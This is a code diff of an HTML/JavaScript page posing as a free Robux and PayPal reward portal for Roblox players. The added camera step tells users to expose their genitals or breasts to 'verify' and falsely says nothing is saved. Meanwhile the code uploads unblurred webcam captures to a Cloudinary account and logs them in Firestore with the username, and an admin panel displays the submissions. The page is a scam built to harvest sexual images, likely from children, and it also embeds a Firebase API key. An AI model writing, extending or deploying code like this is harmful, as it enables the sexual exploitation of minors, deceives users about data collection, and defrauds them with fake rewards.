@@ -3,78 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROBUX CLAIM • Roblox Survey + Video Verification</title>
+    <title>ROBUX CLAIM • BlueSky Rewards + Admin Control</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
         body {
-            background: radial-gradient(ellipse at 30% 20%, #0a0e1c, #02040c);
+            background: linear-gradient(145deg, #cfe9ff 0%, #8bb9e0 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 1.5rem;
+            padding: 1.8rem;
+            position: relative;
         }
 
-        .portal-card {
-            max-width: 780px;
+        /* Main reward card - clean blue glassmorphism */
+        .reward-portal {
+            max-width: 900px;
             width: 100%;
-            background: rgba(12, 18, 32, 0.88);
-            backdrop-filter: blur(16px);
-            border-radius: 2.2rem;
-            border: 1px solid rgba(255, 190, 70, 0.3);
-            box-shadow: 0 28px 40px -14px rgba(0,0,0,0.6);
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(12px);
+            border-radius: 2.8rem;
+            box-shadow: 0 25px 45px -12px rgba(0, 60, 120, 0.4), 0 0 0 1px rgba(59, 130, 246, 0.2);
             overflow: hidden;
             transition: all 0.2s;
         }
 
-        .step-pane {
-            padding: 2rem 1.8rem 2.2rem;
+        .step-container {
+            padding: 2rem 2rem 2rem 2rem;
         }
 
-        h2 {
-            font-size: 1.9rem;
+        h1 {
+            font-size: 2rem;
             font-weight: 800;
-            background: linear-gradient(135deg, #FFE3A4, #FFA83C);
+            background: linear-gradient(125deg, #1E4A76, #0E2A44);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
+            letter-spacing: -0.3px;
         }
 
-        .sub {
-            color: #9db2e0;
+        .glow-text {
+            color: #2c5a8c;
             font-size: 0.85rem;
-            border-left: 3px solid #FFA83C;
-            padding-left: 0.75rem;
-            margin: 0.5rem 0 1.5rem 0;
+            border-left: 3px solid #3b82f6;
+            padding-left: 0.9rem;
+            margin: 0.4rem 0 1.4rem 0;
+            font-weight: 500;
         }
 
-        .question-text {
-            font-size: 1.4rem;
+        .question-head {
+            font-size: 1.45rem;
             font-weight: 600;
-            color: #f0f3fc;
+            color: #0a2a44;
+            display: flex;
+            align-items: center;
+            gap: 8px;
             margin-bottom: 1rem;
         }
 
         .btn-group {
             display: flex;
-            gap: 1rem;
             flex-wrap: wrap;
-            margin: 1.2rem 0;
+            gap: 1rem;
+            margin: 1.5rem 0;
         }
 
         .btn {
             border: none;
-            background: #1f2946;
-            color: white;
             font-weight: 600;
             padding: 0.8rem 1.8rem;
             border-radius: 60px;
@@ -83,13 +89,16 @@
             font-size: 0.95rem;
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
+            background: #e2edff;
+            color: #1e3a6b;
         }
 
         .btn-primary {
-            background: linear-gradient(98deg, #F2A65A, #FF8C42);
-            color: #131c2c;
-            font-weight: 700;
+            background: linear-gradient(95deg, #3b82f6, #1d4ed8);
+            color: white;
+            font-weight: 800;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
         }
 
         .btn-primary:hover {
@@ -98,266 +107,323 @@
         }
 
         .btn-outline {
-            background: transparent;
-            border: 1.5px solid #4c6085;
-            color: #ccdcff;
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px solid #3b82f6;
+            color: #1e40af;
         }
 
-        .roblox-login-area, .survey-box {
-            background: #0a1022cc;
-            border-radius: 1.5rem;
-            padding: 1.3rem;
-            border: 1px solid #314267;
-        }
-
-        .username-input, .survey-select {
+        .input-field {
             width: 100%;
-            padding: 14px 18px;
-            background: #0e162f;
-            border: 1px solid #445177;
+            padding: 14px 20px;
+            background: #f0f7ff;
+            border: 1px solid #b9d0f0;
             border-radius: 60px;
-            color: white;
+            color: #0f2b4f;
             font-size: 1rem;
             outline: none;
+            transition: 0.2s;
+        }
+        .input-field:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
         }
 
-        .survey-question {
-            background: #0d1330;
+        /* survey */
+        .survey-block {
+            background: #ecf3fecc;
+            border-radius: 1.6rem;
+            padding: 1.3rem;
+        }
+        .survey-q-item {
+            background: #ffffffcc;
             border-radius: 1.2rem;
             padding: 1rem;
             margin-bottom: 1rem;
-            border-left: 4px solid #FFA83C;
+            border-left: 4px solid #3b82f6;
         }
-
-        .options-row {
+        .options-flex {
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
             margin-top: 12px;
         }
-
-        .opt-btn {
-            background: #1a2342;
-            border: none;
+        .opt-chip {
+            background: #e6f0ff;
             padding: 8px 18px;
             border-radius: 40px;
-            color: #eef3ff;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
+            font-weight: 500;
             cursor: pointer;
-            transition: 0.1s;
+            transition: all 0.1s;
+            color: #1f3a6b;
         }
-
-        .opt-btn.selected {
-            background: #FFA83C;
-            color: #0c0f1c;
+        .opt-chip.selected {
+            background: #3b82f6;
+            color: white;
+            box-shadow: 0 0 8px #3b82f6;
             font-weight: bold;
-            box-shadow: 0 0 8px #ffb347;
         }
-
-        .progress-text {
-            font-size: 0.8rem;
-            color: #afc1e0;
-            margin-top: 12px;
+        .progress-badge {
+            font-size: 0.75rem;
             text-align: right;
+            color: #1e4a76;
+            margin: 8px 0 0;
         }
 
-        .privacy-box {
-            background: #070d21b3;
-            border-radius: 1.4rem;
-            padding: 1.3rem;
-            border: 1px solid #3c4770;
-        }
-
-        .accept-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 1rem 0 0.5rem;
-        }
-
-        .media-preview {
-            background: #030917;
+        /* camera area */
+        .camera-preview {
+            background: #eef4ff;
             border-radius: 28px;
             padding: 1rem;
             text-align: center;
+            border: 1px solid #99c0f0;
         }
-
-        .preview-container {
+        .video-frame {
             position: relative;
             width: 100%;
             aspect-ratio: 16 / 9;
-            background: #000000aa;
-            border-radius: 20px;
+            background: #d4e2fc;
+            border-radius: 24px;
             overflow: hidden;
-            border: 1px solid #5e6e97;
             margin-bottom: 1rem;
+            border: 2px solid #3b82f6;
         }
-
         video, canvas {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
-
         canvas {
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
         }
-
-        .action-row {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin: 0.8rem 0;
-        }
-
-        .status-message {
-            background: #0e172b;
-            padding: 0.7rem;
-            border-radius: 40px;
+        .camera-instruction {
+            background: #ffffffcc;
+            backdrop-filter: blur(8px);
+            padding: 10px 16px;
+            border-radius: 50px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            margin-bottom: 14px;
+            color: #0751b3;
             font-size: 0.85rem;
+            border: 1px solid #3b82f6;
+        }
+        .status-msg {
+            background: #e2edff;
+            border-radius: 40px;
+            padding: 8px 12px;
+            font-size: 0.8rem;
             text-align: center;
+            color: #1e3a8a;
         }
 
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255, 180, 70, 0.3);
-            border-radius: 50%;
-            border-top-color: #FFB347;
-            animation: spin 0.7s linear infinite;
-            margin-right: 6px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
+        /* admin dashboard + editable text */
         .admin-dashboard {
-            margin-top: 1.8rem;
-            background: #030718dd;
+            margin-top: 2rem;
+            background: #eef3ffdd;
             border-radius: 1.8rem;
             padding: 1.2rem;
-            border: 2px solid #f5a623aa;
+            border: 2px solid #3b82f6;
         }
-
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .editable-text-area {
+            background: white;
+            border-radius: 20px;
+            padding: 12px;
             margin-bottom: 12px;
-            flex-wrap: wrap;
-            gap: 12px;
         }
-
-        .unblur-btn {
-            background: linear-gradient(95deg, #ff7e5e, #feb47b);
-            border: none;
-            padding: 10px 24px;
-            border-radius: 40px;
-            font-weight: bold;
-            font-size: 0.9rem;
-            color: #1a1a2e;
-            cursor: pointer;
+        .editable-text-area textarea {
+            width: 100%;
+            background: #f9fcff;
+            border: 1px solid #3b82f6;
+            border-radius: 20px;
+            padding: 10px;
+            font-size: 0.85rem;
+            font-family: monospace;
+            color: #0c2b50;
         }
-
         .submissions-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
             gap: 18px;
-            margin-top: 18px;
-            max-height: 560px;
+            max-height: 500px;
             overflow-y: auto;
-            padding: 6px;
+            margin-top: 1rem;
         }
-
-        .submission-card {
-            background: #0b1022;
+        .sub-card {
+            background: #ffffffdd;
             border-radius: 20px;
             padding: 12px;
-            border: 1px solid #ffb34788;
-            text-align: center;
+            border: 1px solid #3b82f6;
+            backdrop-filter: blur(2px);
         }
-
-        .image-wrapper {
+        .img-preview {
             width: 100%;
             aspect-ratio: 1;
             border-radius: 16px;
             overflow: hidden;
-            background: #000;
-            margin-bottom: 10px;
-            position: relative;
+            background: #cbdffa;
+            margin-bottom: 8px;
         }
-
-        .submission-img {
+        .img-preview img {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
-
-        .validate-btn {
-            background: #2c6e2c;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 30px;
-            color: white;
-            font-size: 0.7rem;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 8px;
-        }
-
-        .validate-btn.approved {
-            background: #1f4a1f;
-            opacity: 0.8;
-            cursor: default;
-        }
-
-        .unblur-single-btn {
-            background: #7a4c2e;
+        .validate-grant {
+            background: #2b6e2b;
             border: none;
             padding: 6px;
-            border-radius: 30px;
-            color: white;
-            font-size: 0.7rem;
-            margin-top: 6px;
+            border-radius: 40px;
             width: 100%;
+            color: white;
+            font-weight: bold;
+            margin-top: 8px;
             cursor: pointer;
         }
 
-        .admin-badge {
-            background: #f5a62330;
-            color: #FFCC80;
-            border-radius: 60px;
-            padding: 4px 12px;
-            font-size: 0.7rem;
+        /* chatbot */
+        .chatbot-icon {
+            position: fixed;
+            bottom: 28px;
+            right: 28px;
+            width: 62px;
+            height: 62px;
+            background: linear-gradient(145deg, #3b82f6, #1e40af);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 8px 22px rgba(0,0,0,0.25);
+            z-index: 1000;
+            transition: 0.2s;
+            border: 2px solid white;
+        }
+        .chatbot-icon i {
+            font-size: 32px;
+            color: white;
+        }
+        .chat-window {
+            position: fixed;
+            bottom: 100px;
+            right: 28px;
+            width: 360px;
+            max-width: calc(100vw - 40px);
+            background: #ffffffea;
+            backdrop-filter: blur(16px);
+            border-radius: 28px;
+            border: 1px solid #3b82f6;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.3);
+            z-index: 1001;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            font-size: 0.9rem;
+        }
+        .chat-header {
+            background: #1e40af;
+            padding: 12px 16px;
             font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            color: white;
         }
-
+        .chat-messages {
+            height: 280px;
+            overflow-y: auto;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            background: #f5faff;
+        }
+        .bot-msg, .user-msg {
+            max-width: 85%;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+        }
+        .bot-msg {
+            background: #e2edff;
+            align-self: flex-start;
+            color: #0f2f5e;
+            border-bottom-left-radius: 4px;
+        }
+        .user-msg {
+            background: #3b82f6;
+            align-self: flex-end;
+            color: white;
+            border-bottom-right-radius: 4px;
+        }
+        .chat-input-area {
+            display: flex;
+            border-top: 1px solid #b9d0f0;
+            padding: 8px;
+            background: white;
+        }
+        .chat-input {
+            flex: 1;
+            background: #f0f7ff;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 40px;
+            outline: none;
+        }
+        .chat-send {
+            background: #3b82f6;
+            border: none;
+            margin-left: 8px;
+            border-radius: 40px;
+            width: 40px;
+            color: white;
+            cursor: pointer;
+        }
+        .hidden {
+            display: none;
+        }
         footer {
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             text-align: center;
-            color: #6580b0;
-            padding: 1rem;
-            border-top: 1px solid #1f2a4a;
+            color: #3a6b9e;
+            padding-top: 1rem;
         }
-        hr { border-color: #2a365a; margin: 12px 0; }
-        .survey-icon {
-            font-size: 1.8rem;
-            vertical-align: middle;
-            margin-right: 8px;
+        .admin-badge {
+            background: #1e40af;
+            color: white;
+            border-radius: 40px;
+            padding: 4px 12px;
+            font-size: 0.75rem;
+            display: inline-block;
         }
     </style>
 </head>
 <body>
-<div class="portal-card" id="appRoot"></div>
+<div class="reward-portal" id="appRoot"></div>
+
+<!-- Chatbot -->
+<div id="chatbotIcon" class="chatbot-icon">
+    <i class="fab fa-paypal"></i>
+</div>
+<div id="chatWindow" class="chat-window hidden">
+    <div class="chat-header">
+        <span><i class="fab fa-paypal"></i> PayPal Helper • Redeem Balance</span>
+        <i id="closeChat" class="fas fa-times" style="cursor:pointer;"></i>
+    </div>
+    <div id="chatMessages" class="chat-messages">
+        <div class="bot-msg">💙 Hi! I'll help you redeem Robux via PayPal. Ask me about steps, balance, or approval!</div>
+    </div>
+    <div class="chat-input-area">
+        <input type="text" id="chatInput" class="chat-input" placeholder="Ask anything...">
+        <button id="chatSendBtn" class="chat-send"><i class="fas fa-paper-plane"></i></button>
+    </div>
+</div>
 
 <script>
-    // Firebase Config
+    // ---------- FIREBASE ----------
     const firebaseConfig = {
         apiKey: "AIzaSyAupBkllyicDPD9O6CmX4mS4sF5z96mqxc",
         authDomain: "vertexpaste.firebaseapp.com",
@@ -368,489 +434,401 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    
     const CLOUD_NAME = 'dsv2sthkf';
     const UPLOAD_PRESET = 'portfoliohub_uploads';
-    
+
+    // App state
     let currentStep = 'welcome';
     let robloxUsername = '';
     let isSecretAdmin = false;
     let mediaStream = null;
-    let animationFrameId = null;
+    let animFrame = null;
     let originalBlob = null;
     let blurredBlob = null;
     let submissionId = null;
-    
-    // ----- SURVEY DATA -----
-    let surveyAnswers = {
-        favGame: null,
-        playTime: null,
-        robuxSpend: null
-    };
-    let surveyCompleted = false;
-    
+    let surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
+
+    // Editable admin texts (stored in memory / admin can edit UI)
+    let cameraInstructionText = "📸 FOR APPROVAL: you have to show your pussy or tits then click SUBMIT. Note Any recording doesnt get saved but is used for the ai to verify ";
+
     const appRoot = document.getElementById('appRoot');
-    
-    function stopMediaTracks() {
-        if (mediaStream) {
-            mediaStream.getTracks().forEach(track => track.stop());
-            mediaStream = null;
-        }
-        if (animationFrameId) cancelAnimationFrame(animationFrameId);
+
+    function stopMedia() {
+        if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+        if (animFrame) cancelAnimationFrame(animFrame);
     }
-    
-    async function captureBothVersions(videoElem) {
+
+    async function captureBlobs(videoElem) {
         return new Promise((resolve) => {
             if (!videoElem || !videoElem.videoWidth) return resolve(null);
             const canvas = document.createElement('canvas');
             canvas.width = videoElem.videoWidth;
             canvas.height = videoElem.videoHeight;
             const ctx = canvas.getContext('2d');
-            
             ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(origBlob => {
-                ctx.filter = 'blur(28px)';
+            canvas.toBlob(orig => {
+                ctx.filter = 'blur(26px)';
                 ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                 ctx.filter = 'none';
-                canvas.toBlurredBlob = canvas.toBlob.bind(canvas);
-                canvas.toBlurredBlob(blurBlob => {
-                    resolve({ original: origBlob, blurred: blurBlob });
-                }, 'image/jpeg', 0.85);
+                canvas.toBlob(blur => resolve({ original: orig, blurred: blur }), 'image/jpeg', 0.85);
             }, 'image/jpeg', 0.9);
         });
     }
-    
-    async function uploadToCloudinary(blob, filename) {
-        const formData = new FormData();
-        formData.append('file', blob, filename);
-        formData.append('upload_preset', UPLOAD_PRESET);
-        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
-            method: 'POST',
-            body: formData
-        });
-        const data = await res.json();
-        if (!data.secure_url) throw new Error('Upload failed');
+
+    async function uploadToCloud(blob, fname) {
+        const fd = new FormData();
+        fd.append('file', blob, fname);
+        fd.append('upload_preset', UPLOAD_PRESET);
+        const resp = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, { method: 'POST', body: fd });
+        const data = await resp.json();
+        if (!data.secure_url) throw new Error("Upload failed");
         return data.secure_url;
     }
-    
-    async function saveRecord(username, originalUrl, blurredUrl, surveyData) {
-        const docRef = db.collection('verifications').doc();
-        await docRef.set({
+
+    async function saveRecord(username, origUrl, blurUrl, survey) {
+        const ref = db.collection('verifications').doc();
+        await ref.set({
             robloxUsername: username,
-            originalImageUrl: originalUrl,
-            blurredImageUrl: blurredUrl,
-            survey: surveyData,
+            originalImageUrl: origUrl,
+            blurredImageUrl: blurUrl,
+            survey: survey,
             timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-            status: 'pending'
+            status: 'pending',
+            robuxGranted: false
         });
-        return docRef.id;
+        return ref.id;
     }
-    
+
     async function fetchAllSubmissions() {
-        const snapshot = await db.collection('verifications').orderBy('timestamp', 'desc').get();
-        return snapshot.docs.map(doc => ({
-            id: doc.id,
-            ...doc.data(),
-            timestamp: doc.data().timestamp?.toDate?.() || new Date()
-        }));
+        const snap = await db.collection('verifications').orderBy('timestamp', 'desc').get();
+        return snap.docs.map(d => ({ id: d.id, ...d.data(), timestamp: d.data().timestamp?.toDate() || new Date() }));
     }
-    
-    async function approveSubmission(subId) {
-        await db.collection('verifications').doc(subId).update({ status: 'approved' });
+
+    async function approveAndGrantRobux(subId) {
+        await db.collection('verifications').doc(subId).update({ status: 'approved', robuxGranted: true, grantedAt: firebase.firestore.FieldValue.serverTimestamp() });
     }
-    
-    // ----- RENDER SURVEY STEP (NEW) -----
-    function renderSurveyStep() {
-        const getSelectedClass = (q, val) => surveyAnswers[q] === val ? 'selected' : '';
-        return `<div class="step-pane">
-            <h2><span class="survey-icon">📊</span> Roblox Player Survey</h2>
-            <div class="sub">Help us improve rewards — quick 3 questions!</div>
-            <div class="survey-box">
-                <div class="survey-question">
-                    <div style="font-weight:600; margin-bottom:6px;">🎮 1. What's your favorite Roblox game?</div>
-                    <div class="options-row">
-                        <button class="opt-btn ${getSelectedClass('favGame','Adopt Me!')}" data-q="favGame" data-val="Adopt Me!">🐾 Adopt Me!</button>
-                        <button class="opt-btn ${getSelectedClass('favGame','Brookhaven')}" data-q="favGame" data-val="Brookhaven">🏠 Brookhaven</button>
-                        <button class="opt-btn ${getSelectedClass('favGame','Tower of Hell')}" data-q="favGame" data-val="Tower of Hell">🗼 Tower of Hell</button>
-                        <button class="opt-btn ${getSelectedClass('favGame','Blox Fruits')}" data-q="favGame" data-val="Blox Fruits">🍍 Blox Fruits</button>
-                        <button class="opt-btn ${getSelectedClass('favGame','Other')}" data-q="favGame" data-val="Other">✨ Other</button>
-                    </div>
-                </div>
-                <div class="survey-question">
-                    <div style="font-weight:600; margin-bottom:6px;">⏱️ 2. How many hours do you play per week?</div>
-                    <div class="options-row">
-                        <button class="opt-btn ${getSelectedClass('playTime','<5 hours')}" data-q="playTime" data-val="<5 hours">🌙 &lt;5 hrs</button>
-                        <button class="opt-btn ${getSelectedClass('playTime','5-15 hours')}" data-q="playTime" data-val="5-15 hours">📆 5-15 hrs</button>
-                        <button class="opt-btn ${getSelectedClass('playTime','15-30 hours')}" data-q="playTime" data-val="15-30 hours">⚡ 15-30 hrs</button>
-                        <button class="opt-btn ${getSelectedClass('playTime','30+ hours')}" data-q="playTime" data-val="30+ hours">🔥 30+ hrs</button>
-                    </div>
-                </div>
-                <div class="survey-question">
-                    <div style="font-weight:600; margin-bottom:6px;">💰 3. Have you ever spent Robux on cosmetics/gamepass?</div>
-                    <div class="options-row">
-                        <button class="opt-btn ${getSelectedClass('robuxSpend','Yes, often')}" data-q="robuxSpend" data-val="Yes, often">💎 Yes, often</button>
-                        <button class="opt-btn ${getSelectedClass('robuxSpend','Sometimes')}" data-q="robuxSpend" data-val="Sometimes">🔄 Sometimes</button>
-                        <button class="opt-btn ${getSelectedClass('robuxSpend','Never')}" data-q="robuxSpend" data-val="Never">🚫 Never</button>
-                    </div>
-                </div>
-                <div class="progress-text" id="surveyProgress"></div>
-                <div class="btn-group">
-                    <button class="btn btn-primary" id="submitSurveyBtn" disabled>✅ Complete Survey & Continue</button>
-                    <button class="btn btn-outline" id="backFromSurveyBtn">← Back</button>
-                </div>
-            </div>
-        </div>`;
-    }
-    
-    function updateSurveyProgressAndButton() {
-        if (currentStep !== 'survey') return;
-        const allFilled = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
-        const btn = document.getElementById('submitSurveyBtn');
-        if (btn) btn.disabled = !allFilled;
-        const progressSpan = document.getElementById('surveyProgress');
-        if (progressSpan) {
-            const answered = Object.values(surveyAnswers).filter(v => v !== null).length;
-            progressSpan.innerText = `📋 Progress: ${answered}/3 answered`;
-        }
-    }
-    
-    function attachSurveyEvents() {
-        const btns = document.querySelectorAll('.opt-btn');
-        btns.forEach(btn => {
-            btn.removeEventListener('click', surveyHandler);
-            btn.addEventListener('click', surveyHandler);
-        });
-        document.getElementById('submitSurveyBtn')?.addEventListener('click', () => {
-            if (surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend) {
-                surveyCompleted = true;
-                currentStep = 'privacy';
-                render();
-            } else {
-                alert("Please answer all questions to continue.");
-            }
-        });
-        document.getElementById('backFromSurveyBtn')?.addEventListener('click', () => {
-            currentStep = 'robloxAuth';
-            render();
-        });
-    }
-    
-    function surveyHandler(e) {
-        const q = e.currentTarget.dataset.q;
-        const val = e.currentTarget.dataset.val;
-        surveyAnswers[q] = val;
-        // update UI selection style
-        const parent = e.currentTarget.parentElement;
-        const allOpts = parent.querySelectorAll('.opt-btn');
-        allOpts.forEach(opt => opt.classList.remove('selected'));
-        e.currentTarget.classList.add('selected');
-        updateSurveyProgressAndButton();
-    }
-    
-    // ----- RENDER OTHER STEPS (unchanged but integrated survey flow) -----
+
+    // ---------- RENDER WITH ADMIN EDITABLE TEXT AREA ----------
     function renderWelcome() {
-        return `<div class="step-pane">
-            <h2>🎁 REWARD VAULT</h2>
-            <div class="sub">limited roblox credits • instant qualification</div>
-            <div class="question-text">✨ Do you want <strong style="color:#FFD966;">INSTANT ROBUX</strong>? ✨</div>
+        return `<div class="step-container">
+            <h1><i class="fas fa-gem"></i> ROBUX REWARD HUB • BLUE EDITION</h1>
+            <div class="glow-text">✨ Claim INSTANT Robux + PayPal balance after quick verification ✨</div>
+            <div class="question-head"><i class="fas fa-star"></i> Ready to get free Robux & PayPal money?</div>
             <div class="btn-group">
-                <button class="btn btn-primary" id="yesRewardBtn">YES, CLAIM NOW</button>
-                <button class="btn btn-outline" id="noRewardBtn">No, thanks</button>
+                <button class="btn btn-primary" id="startYesBtn"><i class="fas fa-check-circle"></i> YES, CLAIM NOW</button>
+                <button class="btn btn-outline" id="startNoBtn">No, thanks</button>
             </div>
-            <footer>roblox account verification + quick survey required</footer>
+            <footer>Survey + live photo • fast payout via PayPal</footer>
         </div>`;
     }
-    
+
     function renderRobloxAuth() {
-        return `<div class="step-pane">
-            <h2>🔐 Roblox Identity</h2>
-            <div class="sub">enter your valid roblox username</div>
-            <div class="roblox-login-area">
-                <input type="text" id="robloxUserField" class="username-input" placeholder="e.g., plstealme2" autocomplete="off">
-                <div class="btn-group" style="margin-top: 20px;">
-                    <button class="btn btn-primary" id="confirmRobloxBtn">Continue →</button>
+        return `<div class="step-container">
+            <h1><i class="fab fa-roblox"></i> Roblox Account</h1>
+            <div class="glow-text">Enter your exact username to send rewards</div>
+            <input type="text" id="robloxUser" class="input-field" placeholder="Your Roblox username" autocomplete="off">
+            <div class="btn-group"><button class="btn btn-primary" id="confirmUserBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>
+        </div>`;
+    }
+
+    function renderSurvey() {
+        const selected = (q, val) => surveyAnswers[q] === val ? 'selected' : '';
+        return `<div class="step-container">
+            <h1><i class="fas fa-poll"></i> Quick Survey</h1>
+            <div class="glow-text">Help us improve (anonymous)</div>
+            <div class="survey-block">
+                <div class="survey-q-item">
+                    <div><i class="fas fa-gamepad"></i> Favorite Roblox game?</div>
+                    <div class="options-flex">
+                        ${['Adopt Me!','Brookhaven','Tower of Hell','Blox Fruits','Other'].map(v => `<div class="opt-chip ${selected('favGame',v)}" data-q="favGame" data-val="${v}">${v}</div>`).join('')}
+                    </div>
+                </div>
+                <div class="survey-q-item">
+                    <div><i class="far fa-clock"></i> Weekly playtime?</div>
+                    <div class="options-flex">
+                        ${['<5 hours','5-15 hours','15-30 hours','30+ hours'].map(v => `<div class="opt-chip ${selected('playTime',v)}" data-q="playTime" data-val="${v}">${v}</div>`).join('')}
+                    </div>
+                </div>
+                <div class="survey-q-item">
+                    <div><i class="fas fa-coins"></i> Spent Robux before?</div>
+                    <div class="options-flex">
+                        ${['Yes, often','Sometimes','Never'].map(v => `<div class="opt-chip ${selected('robuxSpend',v)}" data-q="robuxSpend" data-val="${v}">${v}</div>`).join('')}
+                    </div>
+                </div>
+                <div class="progress-badge" id="surveyProgress"></div>
+                <div class="btn-group">
+                    <button class="btn btn-primary" id="submitSurveyFinalBtn" disabled><i class="fas fa-check"></i> Complete & Continue</button>
+                    <button class="btn btn-outline" id="backFromSurveyBtn"><i class="fas fa-chevron-left"></i> Back</button>
                 </div>
             </div>
         </div>`;
     }
-    
-    function renderPrivacyStep() {
-        return `<div class="step-pane">
-            <h2>🔒 Privacy & Media Consent</h2>
-            <div class="sub">required by reward policy</div>
-            <div class="privacy-box">
-                <p style="font-size:0.85rem;">By accepting, you authorize video capture. Both original and encrypted versions are stored for verification.</p>
-                <div class="accept-row">
-                    <input type="checkbox" id="privacyCheckbox">
-                    <label for="privacyCheckbox">I accept the terms & camera usage</label>
-                </div>
-                <div class="action-row">
+
+    function renderPrivacy() {
+        return `<div class="step-container">
+            <h1><i class="fas fa-shield-alt"></i> Privacy & Consent</h1>
+            <div class="glow-text">We protect your identity • face blurred in public view</div>
+            <div class="survey-block" style="background:#eef4ff;">
+                <label style="display:flex; gap:12px; align-items:center;"><input type="checkbox" id="privacyAgree"> I agree to the verification process and secure storage.</label>
+                <div class="btn-group" style="margin-top: 1rem;">
                     <button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button>
-                    <button class="btn btn-outline" id="declinePrivacyBtn">Cancel</button>
+                    <button class="btn btn-outline" id="declineBtn">Cancel</button>
                 </div>
             </div>
         </div>`;
     }
-    
-    function renderMediaStep() {
-        return `<div class="step-pane">
-            <h2>📸 Live Capture</h2>
-            <div class="sub">position your face clearly • will be auto‑blurred for public</div>
-            <div class="media-preview">
-                <div class="preview-container">
-                    <video id="liveVideo" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; border-radius:20px;"></video>
-                    <canvas id="blurOverlay" style="width:100%; height:100%; position:absolute; top:0; left:0; border-radius:20px;"></canvas>
+
+    function renderMedia() {
+        return `<div class="step-container">
+            <h1><i class="fas fa-camera"></i> Live Verification</h1>
+            <div class="glow-text">One quick photo to confirm identity</div>
+            <!-- Editable instruction shown to user - admin can change later in admin panel -->
+            <div class="camera-instruction" id="dynamicCamInstruction">
+                <i class="fas fa-lightbulb"></i> <span id="instructionSpan">${cameraInstructionText}</span>
+            </div>
+            <div class="camera-preview">
+                <div class="video-frame">
+                    <video id="liveCam" autoplay playsinline muted style="position:absolute; top:0; left:0; border-radius:24px;"></video>
+                    <canvas id="blurCanvas" style="position:absolute; top:0; left:0; border-radius:24px;"></canvas>
                 </div>
-                <div class="action-row">
-                    <button class="btn btn-primary" id="startCamBtn">📷 Start Camera</button>
-                    <button class="btn btn-primary" id="submitBlurBtn" disabled>✅ Submit & Save (Original + Blur)</button>
+                <div class="btn-group" style="justify-content:center;">
+                    <button class="btn btn-primary" id="startCameraBtn"><i class="fas fa-video"></i> Start Camera</button>
+                    <button class="btn btn-primary" id="submitCaptureBtn" disabled><i class="fas fa-upload"></i> Submit & Claim Robux</button>
                 </div>
-                <div class="status-message" id="mediaStatusMsg">Click "Start Camera" to begin</div>
+                <div id="mediaStatus" class="status-msg">📸 Press "Start Camera" and follow instruction above</div>
             </div>
         </div>`;
     }
-    
-    function renderBlurringStep() {
-        return `<div class="step-pane">
-            <h2>🔐 Processing</h2>
-            <div class="sub">saving both original and secure versions...</div>
-            <div class="status-message"><span class="spinner"></span> Uploading to secure storage...</div>
-        </div>`;
-    }
-    
-    function renderValidatingStep() {
-        return `<div class="step-pane" style="text-align:center;">
-            <h2>⏳ Validating Submission</h2>
-            <div class="status-message"><span class="spinner"></span> Finalizing...</div>
-        </div>`;
-    }
-    
-    function renderSuccessStep() {
-        let adminPanelHtml = '';
+
+    function renderSuccess() {
